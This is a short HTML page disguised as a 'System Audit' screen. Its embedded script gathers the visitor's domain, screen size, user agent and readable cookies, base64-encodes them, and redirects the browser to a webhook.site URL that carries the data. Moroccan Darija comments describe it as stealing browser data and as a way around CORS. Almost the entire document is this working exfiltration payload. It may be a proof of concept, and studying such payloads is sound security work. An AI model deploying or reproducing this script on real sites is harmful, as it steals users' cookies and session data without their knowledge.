<!DOCTYPE html>
<html>
<body>
    <h1>System Audit... Please wait.</h1>
    <script>
        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";

        // غانحاولو نسرقو المعلومات اللي كيقدر يقرأها المتصفح بلا قيود CORS
        // ونضيفو ليها تجربة الـ Redirect باش نثبتو أننا نقدروا نخرجو داتا
        
        var info = {
            domain: document.domain,
            screen: window.screen.width + "x" + window.screen.height,
            ua: navigator.userAgent,
            cookies_visible: document.cookie // غايصيفط غير اللي ماشي HttpOnly
        };

        var payload = btoa(JSON.stringify(info));

        // هادي هي الضربة: كنصيفطو الداتا عبر URL Redirect 
        // هاد الطريقة ما كيحبسهاش CORS حيت المتصفح كيعتبرها "Navigation"
        window.location.href = webhook + "?exfiltrated_data=" + payload;
    </script>
</body>
</html>
